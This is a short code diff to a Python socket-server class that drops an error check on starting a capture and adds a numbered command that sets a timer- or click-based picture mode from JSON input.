@@ -67,7 +67,7 @@ class Main_Sub_Server_Socket:
             
             #Start capture
             generate_capture = capture(path_json=PATH_JSON,path_log=PATH_LOG,name=generate_config["NAME"],ip=generate_config["IP"])
-            if not generate_capture.start_capture():print("Error capture")
+            generate_capture.start_capture()
             
             while True:
                 if subprocess.Popen.poll(server_process) != None:# Forced restart if the server is closed by ? entity
@@ -175,7 +175,18 @@ class Main_Sub_Server_Socket:
                                             else:print("all deleted")
                                     elif commande == 18:MOVE()#voir comment faire
                                     elif commande == 19:PING()#
+                                    elif commande == 20:#
+                                        mode_selected = data_json["mode"]
+                                        timer_selected = int(data_json["number"])
+                                        
+                                        if mode_selected == "TIMER":
+                                            if not PICTURE_MODE(mode="TIMER",timer=timer_selected,path=PATH_JSON):print("Error")
+                                            else: print("Timer set to {} seconds.".format(timer_selected))
+                                        elif  mode_selected == "CLICK":
+                                            if not PICTURE_MODE(mode="CLICK",timer=timer_selected,path=PATH_JSON):print("Error")
+                                            else: print("Timer set to {} clicks.".format(timer_selected))
                                     else: print("Not implemented")
+                                    line = None
         except kill:pass                       
         except ResetConfigException:
             RESET_CONFIG(server_process=server_process)
